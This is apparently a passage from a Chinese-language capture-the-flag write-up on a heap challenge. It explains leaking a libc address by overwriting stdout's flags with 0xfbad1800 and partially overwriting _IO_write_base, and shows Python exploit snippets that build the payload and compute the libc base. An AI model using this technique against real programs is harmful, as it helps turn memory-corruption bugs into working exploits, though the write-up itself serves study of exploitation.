...
重点是程序本身没有泄露，如何泄露libc地址？

出题人用的方法是覆盖stdout的flags标志位`0x00000000fbad1800`，并且把`_IO_write_base`最后一位，使得从新的`_IO_write_base`位置打印出内容来，从而泄露libc地址，其他与house of roman一样，但这里只需要暴力4个bit，因此效率会比较高。
...
payload = p64(0x00000000fbad1800) + p64(0)*3 + "\x08"  # for debug
new_heap(0x30, payload)

libc_base = pick64(io.read(8)) - 0x3ed8b0
lg("libc base address", libc_base)
print rud("$$").encode("hex")
...
payload = p16(0x58e8)
payload = p64(0x7ffff7dd18e8) # for debug
